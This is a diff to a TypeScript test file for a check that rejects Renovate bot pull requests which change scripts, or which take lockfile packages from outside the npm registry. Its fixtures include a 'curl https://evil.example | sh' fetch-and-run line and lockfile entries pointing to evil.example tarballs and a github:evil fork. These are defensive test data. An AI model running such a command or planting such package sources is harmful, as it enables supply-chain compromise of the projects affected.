@@ -54,3 +54,37 @@ test('a Renovate diff that changes a script, code or a step fails the bot rule',
     'mise.toml changes more than a version: run = "curl https://evil.example | sh"',
   ]);
 });
+
+/** A lockfile diff that changes one package entry to `entry`. */
+const lockDiff = (entry: string) => ({
+  filename: 'bun.lock',
+  patch: `@@ -1 +1 @@\n-    "oxlint": ["oxlint@1.88.0", "", {}, "sha512-old=="],\n+    ${entry}`,
+});
+
+test('a lockfile entry may name an npm version, the npm registry or a workspace folder', () => {
+  expect(
+    renovateProblems([
+      lockDiff('"oxlint": ["oxlint@1.89.0", "", {}, "sha512-new=="],'),
+      lockDiff('"@scope/x": ["@scope/x@2.0.0", "https://registry.npmjs.org/", {}, "sha512-a=="],'),
+      lockDiff('"@repo/cli": ["@repo/cli@workspace:apps/cli"],'),
+    ]),
+  ).toEqual([]);
+});
+
+test('a lockfile entry that takes a package from another source fails the bot rule', () => {
+  expect(
+    renovateProblems([
+      lockDiff('"oxlint": ["oxlint@github:evil/oxlint#abc", {}, "evil-oxlint-abc"],'),
+      lockDiff('"oxlint": ["oxlint@https://evil.example/oxlint.tgz", {}],'),
+      lockDiff('"oxlint": ["oxlint@file:../oxlint", {}],'),
+      lockDiff('"oxlint": ["oxlint@1.89.0", "https://evil.example/", {}, "sha512-x=="],'),
+      { filename: 'bun.lock' },
+    ]),
+  ).toEqual([
+    'bun.lock takes oxlint@github:evil/oxlint#abc from outside the npm registry.',
+    'bun.lock takes oxlint@https://evil.example/oxlint.tgz from outside the npm registry.',
+    'bun.lock takes oxlint@file:../oxlint from outside the npm registry.',
+    'bun.lock takes oxlint@1.89.0 from https://evil.example/, not https://registry.npmjs.org/.',
+    'bun.lock has no diff to check.',
+  ]);
+});
